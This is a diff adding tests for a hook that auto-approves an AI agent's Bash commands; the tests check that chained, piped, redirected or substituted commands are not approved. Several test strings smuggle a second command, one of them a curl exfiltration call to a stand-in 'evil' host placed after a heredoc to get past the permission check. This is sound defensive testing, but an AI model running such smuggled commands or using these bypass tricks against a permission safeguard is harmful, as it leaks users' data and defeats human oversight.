@@ -188,6 +188,66 @@ describe('bash-allow hook', () => {
     assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
   });
 
+  it('defers on command chaining with && even when node target is a wrightward script', () => {
+    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc && curl https://example.com`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '');
+  });
+
+  it('defers on semicolon chaining even when node target is a wrightward script', () => {
+    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc; echo x`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '');
+  });
+
+  it('defers on command substitution in args even when node target is a wrightward script', () => {
+    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id $(whoami)`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '');
+  });
+
+  it('defers on pipe chaining even when node target is a wrightward script', () => {
+    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc | tee /tmp/log`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '');
+  });
+
+  it('defers on output redirect even when node target is a wrightward script', () => {
+    const cmd = `node ${SCRIPTS_DIR}/context.js --session-id abc > /tmp/out`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '');
+  });
+
   it('defers on malformed JSON input', () => {
     const stdout = execFileSync('node', [HOOK], {
       input: 'not-json',
@@ -196,5 +256,65 @@ describe('bash-allow hook', () => {
       stdio: ['pipe', 'pipe', 'pipe']
     });
     assert.equal(stdout, '');
+  });
+
+  it('defers when a trailing command follows the heredoc close marker (exfiltration bypass)', () => {
+    // Attacker smuggles a second command AFTER the heredoc. The stripping
+    // regex is anchored with `$` so it only matches heredocs at end of string;
+    // this trailing `; curl ...` keeps the metachar scan active and must NOT
+    // auto-approve. If the anchor regresses (e.g., loses `$`), this would pass.
+    const cmd =
+      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<'EOF'\n` +
+      `{\n` +
+      `  "task": "legit"\n` +
+      `}\n` +
+      `EOF\n` +
+      `curl https://evil.example.com/exfil`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    assert.equal(result.stdout, '', 'must defer — trailing command after heredoc must not auto-approve');
+  });
+
+  it('approves when the heredoc close marker uses <<- dash variant at end of string', () => {
+    const cmd =
+      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<-EOF\n` +
+      `\t{\n` +
+      `\t  "task": "dash-heredoc"\n` +
+      `\t}\n` +
+      `\tEOF`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    const out = parseAllow(result.stdout);
+    assert.ok(out, 'expected JSON on stdout for <<- dash-heredoc');
+    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
+  });
+
+  it('approves an unquoted heredoc marker at end of string', () => {
+    const cmd =
+      `node ${SCRIPTS_DIR}/context.js --session-id '11111111-2222-3333-4444-555555555555' <<EOF\n` +
+      `{\n` +
+      `  "task": "unquoted-marker"\n` +
+      `}\n` +
+      `EOF`;
+    const result = runHook({
+      session_id: 'sess-1',
+      cwd: PLUGIN_ROOT,
+      tool_name: 'Bash',
+      tool_input: { command: cmd }
+    });
+    assert.equal(result.exitCode, 0);
+    const out = parseAllow(result.stdout);
+    assert.ok(out, 'expected JSON on stdout for unquoted heredoc marker');
+    assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
   });
 });
